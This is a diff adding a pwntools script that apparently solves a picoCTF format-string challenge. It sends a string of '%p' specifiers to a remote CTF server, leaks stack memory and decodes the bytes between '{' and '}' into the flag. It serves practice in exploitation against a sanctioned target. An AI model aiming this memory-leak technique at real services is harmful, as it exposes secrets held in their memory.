@@ -1,0 +1,50 @@
+Simple format string  exploit ; searched for { and } and found the flag
+
+from pwn import *
+
+elf = ELF("./a.out")
+
+
+payload = b'%p'*100
+
+# p = elf.process()
+p = remote('mercury.picoctf.net' ,27912)
+
+p.recv()
+p.sendline(b'1')
+
+p.recvuntil(b'?')
+p.sendline(payload)
+p.recvuntil(b':\n')
+x = p.recvline()
+
+
+x = x.split(b'0x')
+
+t = False
+
+arr = []
+
+for i in x:
+    if t :
+        arr.append(i)
+    if b'7b' in i:
+        arr.append(i)
+        t = True
+        continue
+    if b'7d' in i:
+        t = False
+        break
+
+print(arr)
+f = ''
+for i in arr:
+    s = ''
+    for j in range(0,8,2):
+        num = i[j:j+2]
+        s += str(chr(int(num,16)))
+    f +=s[::-1]
+
+print(f)
+
+p.interactive()
